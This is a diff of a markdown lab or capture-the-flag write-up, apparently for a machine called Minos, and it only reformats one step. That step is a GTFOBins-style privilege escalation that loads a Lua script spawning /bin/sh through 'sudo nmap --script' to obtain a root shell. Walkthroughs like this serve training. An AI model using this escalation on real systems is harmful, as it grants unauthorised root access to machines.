@@ -193,11 +193,13 @@ User minos may run the following commands on Minos:
 <img width="937" height="757" alt="gtfobins" src="https://github.com/user-attachments/assets/3828ce83-a87f-4d6a-88fb-63e3985eb67e" />
 
 
-```
-TF=$(mktemp)
-echo 'os.execute("/bin/sh")' > $TF
-sudo nmap --script=$TF
-```
+
+>TF=$(mktemp)
+>
+>echo 'os.execute("/bin/sh")' > $TF
+>
+>sudo nmap --script=$TF
+
 
 ##  BOOM!  We are root
 
